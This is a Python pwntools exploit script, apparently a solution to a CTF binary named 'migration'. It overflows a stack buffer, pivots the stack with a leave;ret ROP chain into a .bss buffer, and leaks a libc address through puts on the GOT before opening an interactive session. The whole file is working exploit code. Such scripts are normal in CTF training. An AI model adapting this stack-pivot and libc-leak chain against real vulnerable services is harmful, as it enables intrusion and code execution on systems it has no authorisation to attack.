#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
import time
p = process("./migration")

p.recvuntil("\n")

# padding 44 蓋掉 EIP
# 蓋掉 ret 後，還剩 16 byte (4 個 gadget)
rop1 = cyclic(40)

buf = 0x804ae00
buf2 = buf + 0x100
read_plt = 0x8048380
puts_plt = 0x8048390
leave_ret = 0x08048418
puts_got = 0x8049ff0
pop_ret = 0x0804836d
ret = 0x08048356

# ebp = buf, ret = read_plt
rop1 += flat([buf, read_plt, leave_ret, 0, buf, 100]) # read(0, buf, 1000)
p.send(rop1)

time.sleep(0.1)

rop2 = flat([buf2, puts_plt, pop_ret, puts_got, read_plt, leave_ret, 0, buf2, 100]) # pop_ret 為了讓 puts 後接續 read()
p.sendline(rop2)

real_read = u32(p.recvuntil("\n")[:-1])
print hex(real_read)

p.interactive()
